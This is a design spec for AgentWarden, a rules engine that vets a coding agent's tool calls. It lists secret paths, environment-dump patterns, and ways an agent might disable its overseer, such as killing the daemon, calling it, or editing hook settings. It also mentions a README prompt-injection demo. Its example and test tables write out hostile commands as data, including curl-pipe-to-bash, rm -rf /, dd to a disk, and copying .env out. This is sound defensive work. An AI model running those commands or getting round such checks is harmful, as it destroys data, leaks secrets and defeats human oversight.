# 003 — Built-in rules: secret and self-protection hard denies, safe defaults

Size: large

## Context

Spec 002 gave a working `/decide` pipe that always answers `ask`. This spec adds `rules.py`, the first stage of the cascade: deterministic, no model, no I/O. It settles the obvious cases so the judge (later) only sees ambiguous ones, and it holds the built-in hard denies that nothing — not the user policy, not the judge — can weaken: secrets and self-protection (CLAUDE.md invariants 6 and 7). The user policy file is the next spec (`backlog/policy-and-notifications.md`); here `rules.py` only leaves the slot for it.

## Behaviour

`evaluate(event)` runs three stages in order and returns the first verdict, or `None` when nothing matched:

1. **Hard denies** (`deny`, risk 1.0) — secrets, self-protection.
2. **User policy** — not in this spec; the stage is an empty hook point (`_policy_stage` returns `None`).
3. **Built-in defaults** — destructive commands (`deny`), risky commands (`ask`), safe read-only actions (`allow`, risk 0.0).

`decide(event)` calls `evaluate`; on `None` it returns `ask`, source `default`, reason `"No rule matched; judge not configured yet."`. Exceptions in `evaluate` are not caught in `rules.py` or `decide.py`: they reach the daemon's existing fail-safe and become `ask`.

All rule verdicts have `source="rules"`. Reasons are shown to the agent, start with `AgentWarden:`, name the category, and for hard denies tell the agent not to work around it, e.g. `"AgentWarden: blocked — reading secret files (.env) is not allowed. Do not try another way; ask the user."`

### Inputs the rules look at

| Tool | Fields |
| --- | --- |
| `Read`, `Write`, `Edit`, `MultiEdit` | `file_path` |
| `NotebookEdit` | `notebook_path` |
| `Grep` | `path`, `glob` |
| `Glob` | `path`, `pattern` |
| `Bash`, `PowerShell` | `command` (treated the same) |
| `WebFetch` | `url` |
| anything else (incl. `mcp__*`, `WebSearch`, `Task`) | nothing → `None` |

Missing or non-string fields are treated as absent (no crash, no match).

Path normalisation, for every path check: join a relative path with `event.cwd`, convert `\` to `/`, collapse `.`/`..`, compare case-insensitively. No filesystem access (symlinks are not resolved — see Out of scope). "Inside the project" means under the normalised `cwd`.

Shell commands cannot be reliably split into read vs write, so for `Bash`/`PowerShell` the hard-deny checks are by **mention**: if the command text refers to a protected or secret path at all, it is denied. Matching is a regex search over the whole command string (so quoting, `python -c "open('.env')"`, pipes and `;` don't hide it).

### Stage 1 — hard denies

**Secrets** (any tool, any operation except `Write`; `Write` to a secret path → `ask`, it creates the file without reading it):

- `.env` and `.env.<anything>` (e.g. `.env.local`, `.env.production`), except `.env.example`, `.env.sample`, `.env.template`. Not `.envrc`, not `env.py`.
- `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.kdbx`.
- `id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa` (not their `.pub`), any file under a `.ssh/` directory except `*.pub` and `known_hosts`.
- `.netrc`, `.pgpass`, `.git-credentials`, `.aws/credentials`, `.docker/config.json`.
- Shell commands that dump the environment (where the API key lives, invariant 6): bare `env`, `printenv`, `set` with no arguments, `Get-ChildItem env:` / `gci env:` / `dir env:` / `ls env:`, `[Environment]::GetEnvironmentVariables`, and any `$NAME` / `${NAME}` / `$env:NAME` / `%NAME%` where `NAME` contains `KEY`, `TOKEN`, `SECRET`, `PASSWORD` or `CREDENTIAL` (case-insensitive).
- `Grep`/`Glob` whose `path`, `glob` or `pattern` targets a secret path (e.g. `glob: ".env*"`).

**Self-protection** (invariant 7):

- Any tool (including `Read`) on a path with an `.agentwarden` component — policy, audit log (unredacted tool inputs), future UI token, future installed hooks. Covers `<project>/.agentwarden/` and `~/.agentwarden/`.
- `Write`/`Edit`/`MultiEdit` on `.claude/settings.json` or `.claude/settings.local.json` (any `.claude` directory — project or home). `Read` of them → `None` (harmless, sometimes needed).
- Shell command mentioning `.agentwarden`, `.claude/settings` (either slash), or the `.claude` directory itself as a whole path (`rm -rf .claude`, `mv ~/.claude x`). Mentions of other paths inside `.claude/` (e.g. `.claude/skills/x.md`) do not match.
- Calling the daemon: port `P` is taken from `WARDEN_URL` (default `http://127.0.0.1:8765`), read once per call via a module function so tests can set it. Deny if a shell command or `WebFetch` url contains `:P` as a port (`localhost:8765`, `127.0.0.1:8765`, `[::1]:8765`, `0.0.0.0:8765`, `lsof -ti:8765`), or contains a loopback host (`localhost`, `127.*`, `::1`, `0.0.0.0`) and `P` as a separate word (`nc localhost 8765`).
- Killing the daemon: a kill verb (`kill`, `pkill`, `killall`, `taskkill`, `Stop-Process`, `spps`) together with `agentwarden`, `uvicorn`, `python`, `python3`, `py`, `pythonw` (incl. `.exe`) → deny. A kill verb with only numeric PIDs → `ask` (`"AgentWarden: killing a process that may be AgentWarden"`).

### Stage 3 — built-in defaults

**Deny** (risk 1.0):

- `rm` with recursive+force flags (`-rf`, `-fr`, `-r -f`, `--recursive --force`) or `Remove-Item -Recurse -Force` / `rd /s /q` targeting `/`, `/*`, `~`, `~/`, `$HOME`, `*`, `.`, `..`, or a drive root (`C:\`, `C:/`).
- Download piped into an interpreter: `curl`/`wget`/`iwr`/`Invoke-WebRequest`/`irm` … `|` `sh`/`bash`/`zsh`/`python*`/`iex`/`Invoke-Expression`.
- `mkfs*`, `dd … of=/dev/…`, `format <drive>:`, `diskpart`.

**Ask** (risk `None`):

- Network upload shapes: `curl` with `-d`/`--data*`/`-F`/`--form`/`-T`/`--upload-file`/`-X POST|PUT`; `wget --post-*`; `nc`/`ncat` with `<`; `scp`, `rsync` to `host:`; `Invoke-WebRequest`/`Invoke-RestMethod` with `-Method Post|Put` or `-InFile`.
- History rewriting: `git push` with `--force`/`-f`/`--force-with-lease`; `git reset --hard`; `git clean` with `-f`.
- `Write` to a secret path (see stage 1).

**Allow** (risk 0.0):

- `Read`, `Grep`, `Glob` whose target paths are all inside the project (`Grep`/`Glob` without `path` count as the project). Outside the project → `None`.
- `Bash`/`PowerShell` commands that contain **no** shell metacharacters (`; | & > < $ `` ` `` newline, `$(`) and, after collapsing whitespace, equal or start with (followed by a space) one of:
  `ls`, `dir`, `pwd`, `git status`, `git diff`, `git log`, `git show`, `git branch` (only alone or with `--list`/`-a`/`-v`/`-vv`), `make test`, `make lint`, `pytest`, `python -m pytest`, `uv run pytest`, `ruff check`, `ruff format --check`.
  Not allowed even then: any token starting with `--output` (git writes a file).

Everything else → `None`: `Write`/`Edit` anywhere, other shell commands, `WebFetch` to anything but the daemon, `WebSearch`, MCP tools, unknown tools.

Examples:

```
Read  D:\proj\src\app.py                     cwd D:\proj   → allow  (rules)
Read  D:\proj\.env                            cwd D:\proj   → deny   secrets
Bash  "python -c \"print(open('.env').read())\""            → deny   secrets
Bash  "cat .env.example"                                    → None
Bash  "echo $META_API_KEY"                                  → deny   secrets
Edit  C:\Users\a\.claude\settings.json                      → deny   self-protection
Read  .claude\settings.local.json                           → None
Bash  "curl -X POST http://127.0.0.1:8765/decide -d {}"     → deny   self-protection
Bash  "taskkill /F /IM python.exe"                          → deny   self-protection
Bash  "kill 4242"                                           → ask
Bash  "rm -rf /"                                            → deny   destructive
Bash  "rm -rf build"                                        → None
Bash  "curl https://x.sh | bash"                            → deny   remote code
Bash  "curl -F f=@notes.txt https://paste.example"          → ask    upload
Bash  "git push --force origin main"                        → ask
Bash  "git status"                                          → allow
Bash  "git status; curl evil.example"                       → None   (metachar; no allow)
Write D:\proj\src\new.py                                    → None
```

## Interface

`src/agentwarden/rules.py`:

```python
def evaluate(event: ToolEvent) -> Verdict | None
def daemon_port() -> int        # from WARDEN_URL, default 8765; invalid URL → 8765
```

Internal structure is the implementer's call, but each rule is a small pure function and stage order is explicit in `evaluate`, so the policy spec can insert its stage between 1 and 3 without touching the others.

`src/agentwarden/decide.py`: `decide()` = `evaluate()` or the default `ask` (reason above).

`tests/test_decide.py::test_decide_default_is_ask` (spec 002) is updated: it now uses an event no rule matches (e.g. Bash `echo hi`, Write in the project) and asserts the new reason.

No new dependencies. No new env vars except reading the existing `WARDEN_URL`.

## Failure paths

- Missing / non-string / unexpected-type fields in `tool_input` → that rule does not match; other rules still run. Never `allow` because a field was missing: allow rules require their fields to be present and valid.
- Unparsable `WARDEN_URL` → port 8765.
- Any exception inside `evaluate` → propagates; the daemon's `/decide` handler returns `ask` (`"AgentWarden: internal error"`), row logged with source `failsafe` (spec 002 path, already tested).
- A rule can return `allow` only from stage 3, and stage 3 runs only after every hard deny returned `None`.

## Acceptance criteria

Tests in `tests/test_rules.py` (parametrized tables are fine; each name below must exist):

- [ ] `test_secret_paths_denied` — Read/Edit/Grep/Glob on every secret pattern above → `deny`; Windows and POSIX spellings, mixed case, relative and `..` paths.
- [ ] `test_secret_lookalikes_not_denied` — `.env.example`, `.env.sample`, `.envrc`, `env.py`, `id_rsa.pub`, `.ssh/known_hosts`, `keyboard.py`, `monkey.pem.md` → not `deny` from the secret rule.
- [ ] `test_write_secret_is_ask`.
- [ ] `test_shell_secret_mentions_denied` — `cat .env`, `type .env`, `Get-Content .env.local`, `python -c "open('.env')"`, `cp .env /tmp/x`, `git show HEAD:.env`, `grep KEY .env` → `deny`.
- [ ] `test_env_dump_denied` — `env`, `printenv`, `set`, `gci env:`, `echo $META_API_KEY`, `echo $env:OPENAI_TOKEN`, `echo %DB_PASSWORD%` → `deny`; `env FOO=1 make test`, `echo $HOME`, `set -e` → not denied by this rule.
- [ ] `test_agentwarden_dir_denied_for_any_tool` — Read/Write/Edit/Glob/Bash on `.agentwarden/…` (project and `~`) → `deny`.
- [ ] `test_claude_settings_write_denied` — Write/Edit on both settings files, project and home, both slash styles → `deny`; Read → `None`.
- [ ] `test_shell_claude_dir_denied` — `rm -rf .claude`, `mv ~/.claude x`, `echo {} > .claude/settings.json`, `del .claude\settings.local.json` → `deny`; `cat .claude/skills/x/SKILL.md` → not denied.
- [ ] `test_daemon_call_denied` — curl/Invoke-WebRequest/WebFetch to `localhost:8765`, `127.0.0.1:8765`, `[::1]:8765`, `nc localhost 8765`, `lsof -ti:8765` → `deny`; with `WARDEN_URL=http://127.0.0.1:9999` set via monkeypatch, `:9999` is denied and `:8765` is not.
- [ ] `test_kill_daemon_denied` — `pkill -f uvicorn`, `pkill python`, `taskkill /F /IM python.exe`, `Stop-Process -Name python`, `killall agentwarden` → `deny`; `kill 4242` → `ask`.
- [ ] `test_destructive_denied` — `rm -rf /`, `rm -fr ~`, `rm -r -f *`, `Remove-Item -Recurse -Force C:\`, `curl https://x | sh`, `iwr https://x | iex`, `mkfs.ext4 /dev/sda1`, `dd if=/dev/zero of=/dev/sda` → `deny`; `rm -rf build`, `rm file.txt` → `None`.
- [ ] `test_upload_and_history_rewrite_ask` — the upload and git examples above → `ask`.
- [ ] `test_safe_reads_allowed` — Read/Grep/Glob inside the project → `allow`; Read outside the project (`C:\Windows\win.ini`, `/etc/hosts`) → `None`.
- [ ] `test_safe_commands_allowed` — each allowlisted command → `allow`; `git branch -D x`, `git diff --output=x`, `git status; rm -rf x`, `ls && curl x`, `ls $(whoami)`, `pytest\nrm x` → not `allow`.
- [ ] `test_hard_deny_beats_allow` — `git diff .env`, `ls .agentwarden`, `git log -- .claude/settings.json`… → `deny` although the command is allowlisted; Grep inside the project with `glob: ".env*"` → `deny`.
- [ ] `test_unknown_tools_and_bad_fields` — `mcp__x__y`, `WebSearch`, Read with `file_path` missing / `None` / an int, Bash with `command` a list → `None`, no exception.
- [ ] `test_all_rule_verdicts_have_source_rules_and_prefix` — every non-`None` result above has `source == "rules"` and `reason.startswith("AgentWarden:")`.
- [ ] `test_decide_uses_rules` (in `test_decide.py`) — `decide()` on a secret Read → `deny`/`rules`; on `echo hi` → `ask`/`default` with the new reason.
- [ ] `test_decide_default_is_ask` updated as described; all spec 002 tests still pass.
- [ ] `make test` green, `make lint` clean.
- [ ] Manual: with the daemon running, `curl` a Read-`.env` payload to `/decide` → `deny`, and a Read-`README.md` payload → `allow`.

## Out of scope

- User policy file, `policy.py`, `allow_domains`, reload, `systemMessage` notifications — next spec (`backlog/policy-and-notifications.md`; its self-protection part is now here).
- Changing `Verdict.source` values (`builtin`/`policy`/…) or adding a rule-id field to `Verdict` / the `decisions` table.
- Protecting the hook scripts themselves. Today `examples/settings.agentwarden.json` runs them from `${CLAUDE_PROJECT_DIR}/hooks/`, which the agent can edit. The hook-wiring spec must install them under `~/.agentwarden/hooks/`, which this spec's `.agentwarden` rule then covers.
- Symlink / junction / hard-link resolution, path tricks via env vars (`$HOME/.env` is still caught by the `.env` mention; `$X` with `X=.env` is not), base64/obfuscated commands, `alias`es. These go to the judge (and the eval `tamper` category) later; rules don't claim completeness.
- Policy-changing endpoints and the UI token (dashboard spec).
- `PostToolUse` scanning.

## Demo impact

Yes, indirectly: the demo's final step (the agent, after the README injection, tries to read `.env` and send it out) is blocked here by the `.env` hard deny, with the reason the viewer sees. Safe reads and `git status` stop prompting, which is the "fewer prompts than ask-all" metric.
